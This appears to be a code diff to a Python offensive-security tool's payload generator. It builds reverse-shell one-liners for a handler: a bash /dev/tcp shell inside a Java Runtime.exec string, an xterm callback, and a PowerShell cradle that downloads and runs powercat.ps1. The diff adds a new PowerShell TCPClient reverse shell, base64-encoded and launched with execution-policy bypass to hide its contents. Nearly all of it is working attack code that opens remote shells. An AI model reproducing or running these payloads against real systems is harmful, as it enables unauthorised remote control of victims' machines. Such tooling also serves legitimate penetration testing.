@@ -7,7 +7,7 @@ import util
 import time
 import threading
 import readline
-
+import base64
 
 def generatePayload(type, local_address, port):
 
@@ -29,8 +29,12 @@ def generatePayload(type, local_address, port):
         return "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()" % (local_address, port)
     elif type == "xterm":
         return "xterm -display %s:1" % (local_address)
-    elif type == "powercat" or type == "powershell":
+    elif type == "powercat":
         return "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://%s/powercat.ps1');powercat -c %s -p %d -e cmd\"" % (local_address, local_address, port)
+    elif type == "powershell":
+        payload = '$a=New-Object System.Net.Sockets.TCPClient("%s",%d);$d=$a.GetStream();[byte[]]$k=0..65535|%%{0};while(($i=$d.Read($k,0,$k.Length)) -ne 0){;$o=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($k,0,$i);$q=(iex $o 2>&1|Out-String);$c=$q+"$ ";$b=([text.encoding]::ASCII).GetBytes($c);$d.Write($b,0,$b.Length);$d.Flush()};$a.Close();' % (local_address, port)
+        payload_encoded = base64.b64encode(payload.encode("UTF-16LE")).decode()
+        return f"powershell.exe -exec bypass -enc {payload_encoded}"
 
 def triggerShell(func, port):
     def _wait_and_exec():
